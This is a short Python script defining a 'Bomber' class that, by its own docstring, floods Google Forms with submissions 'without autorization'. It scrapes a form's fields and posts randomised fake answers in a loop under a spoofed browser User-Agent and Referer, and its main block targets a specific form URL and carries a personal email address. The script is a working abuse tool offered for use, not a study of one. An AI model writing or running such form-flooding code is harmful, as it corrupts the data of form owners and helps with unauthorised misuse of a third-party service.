import random
import requests
from bs4 import BeautifulSoup

class Bomber:
    '''Help to bomb one-list GForms without autorization'''
    def __init__(self, link, mail) -> None:
        '''`link` is a link to form with "viewform" on close'''
        self.link = link
        self.url = self.link.replace('viewform', '').replace('formResponse', '') + 'formResponse'
        self.mail = mail

    def start(self, num_of_requests, *answers, question_seq=None, print_result=False):
        '''Start bombing'''
        def sorting(x):
            x = x['data-params'][x['data-params'].index(',[[') + 3:]
            return x[:x.index(',')]
        
        req_list = []
        response = requests.get(self.link)
        soup = BeautifulSoup(response.text, 'lxml')
        params = list(map(sorting, soup.find_all('div', jsmodel = "CP1oW")))
        print(params)
        for i in range(num_of_requests):
            form_data = {'entry.986720168': ''.join(random.choices(list('1234567890'), k=1)),
                        'entry.1704626263': random.sample(['1', '2', '3', '4', '5', '6', '7', '8', '9', '10'], k=random.randint(1, 10)),
                        'entry.1679341224': random.choice([1, 2, 3, 4]),
                        'draftResponse':[],
                        'pageHistory':0}
            user_agent = {'Referer': self.link,'User-Agent': "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36"}
            r = requests.post(self.url, data=form_data, headers=user_agent)
            req_list.append(r.status_code)
            if print_result:
                print(f'{i + 1} / {num_of_requests} - {"Sucsessful" if r.status_code == 200 else f"Failed: {r.status_code}"}')
        return req_list
        
            

if __name__ == '__main__':
    bber = Bomber('https://docs.google.com/forms/d/e/1FAIpQLSe9Nf5RATGkcd01JAjWRVqMY0dqrhOMoODewsd6E16p5d3r9g/viewform', 'boss.trushchelev@mail.ru')
    bber.start(0, 1, 56, print_result=True)
